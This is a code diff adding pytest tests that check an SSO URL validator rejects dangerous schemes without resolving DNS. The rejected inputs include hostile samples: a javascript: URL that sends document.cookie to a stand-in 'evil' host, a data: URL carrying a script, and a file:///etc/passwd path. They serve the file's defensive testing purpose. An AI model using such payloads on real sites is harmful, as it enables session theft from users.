@@ -67,3 +67,39 @@ class TestSsoUrlValidatorPermissive:
     def test_should_still_reject_non_http_scheme(self):
         with pytest.raises(DisallowedSsoEndpointException):
             SsoUrlValidator(allow_private_networks=True).validate("file:///etc/passwd")
+
+
+class TestSsoUrlValidatorSchemeOnly:
+    """validate_scheme guards a URL handed to a browser (no server-side request),
+    so it checks only the scheme/host and never resolves DNS."""
+
+    @pytest.mark.parametrize(
+        "url",
+        [
+            "javascript:fetch('//evil?c='+document.cookie)",
+            "javascript:alert(1)",
+            "data:text/html,<script>alert(1)</script>",
+            "file:///etc/passwd",
+            "https:///no-host",
+            "not-a-url",
+            "",
+        ],
+    )
+    def test_should_reject_dangerous_or_malformed_scheme(self, url):
+        with pytest.raises(DisallowedSsoEndpointException):
+            SsoUrlValidator().validate_scheme(url)
+
+    def test_should_accept_https_without_dns_lookup(self, monkeypatch):
+        # Would blow up if a DNS resolution were attempted.
+        def _boom(*args, **kwargs):
+            raise AssertionError("validate_scheme must not resolve DNS")
+
+        monkeypatch.setattr(socket, "getaddrinfo", _boom)
+        SsoUrlValidator().validate_scheme("https://accounts.google.com/authorize")
+
+    def test_should_reject_http_in_strict_mode(self):
+        with pytest.raises(DisallowedSsoEndpointException):
+            SsoUrlValidator().validate_scheme("http://accounts.google.com/authorize")
+
+    def test_should_allow_http_in_permissive_mode(self):
+        SsoUrlValidator(allow_private_networks=True).validate_scheme("http://localhost:8080/authorize")
